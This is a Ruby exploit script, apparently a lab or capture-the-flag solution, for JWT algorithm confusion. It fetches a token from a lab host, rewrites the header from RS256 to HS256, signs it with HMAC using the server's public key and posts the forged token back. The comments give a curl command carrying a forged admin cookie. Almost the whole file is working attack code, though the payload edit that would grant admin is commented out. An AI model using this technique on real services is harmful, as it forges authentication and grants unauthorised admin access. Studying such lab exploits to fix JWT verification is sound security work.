# This exploit will break apart the JWT into its respective parts, decode the header and payload, change the payload to be an admin, change the header type to HS256, cimbine the new header and new payload to be the data that will be signed, and sign the new data with the public key in the public.pem file to make a new JWT.
# From here we can curl "curl -H "Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0.FSfvCBAwypJ4abF6jFLmR7JgZhkW674Z8dIdAIRyt1E=" http://ptl-b8c9ff31-3393d66a.libcurl.so/" where the cookie is the new JWT cooking without the trailing "=" and the URL of the main site. 
# This new token can also be placed in the webpage once logged in as a general user and then replacing the cookie for the new token. On refresh the user will be admin.

require 'base64'
require 'openssl'
require 'net/http'
# require 'httparty' 
require 'uri'
require 'json'

# Net::HTTP.get('10.10.101.199', '/')
uri = URI.parse("http://10.10.101.199/")

HOST = '10.10.101.199'

response = Net::HTTP.get_response(HOST, '/')

TOKEN = response.body.split(' ')[4]
# puts "Token: ",TOKEN
pub =  File.open("../TestFiles/public.pem").read
pubHash = pub.unpack("H*").join
puts pubHash


# puts "Public.pem file: "+pub
# TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNTk3ODU3NjkzLCJleHAiOjE1OTc4NTc4MTMsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.ipjlD4ulx4nmFZ2YDNZpRcZlStqzYhmRygyKepxx-7QJ2jcofvg0M-MkqLIUVBo1Fiza1XzFMZrEttR92HiKbBHdOBEdJrgOCrAl8dDxJHeNleDgSUccnJYs_smjVdufWpmwXGKCEDT3QVmsCR3RALnqjwO4ywXRH9FCIftDR5yXUIhH0UDIs2XzMjrC3DHTpIo9pnv0ihOTjFtCQ9zH2CblT3cr3G-4cBCkPx7uzW8rN0Ay22LElhJHyH8syeESrsNhABbJCfWmOL3hveMlIOI3BAuAg-svwW_QWsX1YescXMHXxxArRHgcE4sH_TgnhaxINMWkE1aIGURIAk6-5Q"
header, payload, signature = TOKEN.split('.')
puts "Header: "+signature

decoded_header = Base64.decode64(header)
# puts "Decoded Header",decoded_header

dheader = decoded_header.gsub!("RS256", "HS256")
# puts "Decoded Header",dheader
new_header = Base64.strict_encode64(dheader).gsub("=","")
# puts "New Header: "+new_header


decoded_payload = Base64.decode64(payload)
puts "Decoded Payload: ",decoded_payload

# # decoded_payload.gsub!("test", "admin")
# new_payload = Base64.strict_encode64(decoded_payload).gsub("=","")
# puts "New Payload: ",new_payload


data = new_header+"."+payload
# puts "New Data: ", data

sig = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new("sha256"), pubHash, data)
puts "Openssl Signature: ", sig

Newsignature = Base64.urlsafe_encode64(sig)
puts "New Signature: ", Newsignature
# puts "Data with signature: "+data+"."+signature
newjwt = data+"."+Newsignature.gsub("=","")
# puts "New newjwt: ", newjwt
newPayload = "jwt=#{newjwt}"
puts "New newPayload: ", newPayload.to_json


header2 = {'Content-Type': 'text/json'}
http = Net::HTTP.new(uri.host, uri.port)
# request = Net::HTTP.post_form(uri, {"jwt" => "#{newjwt}"})

request = Net::HTTP::Post.new(uri.request_uri)
# puts "Request", request.body
# request.body = newPayload
request.set_form_data({"jwt" => "#{newjwt}"})
# puts uri

# Send the request
newresponse = http.request(request)




# HTTParty.post("10.10.101.199/", body: { jwt: newjwt })
# newResponse = Net::HTTP.post_form("10.10.101.199/", 'jwt' => newjwt )
puts newresponse.body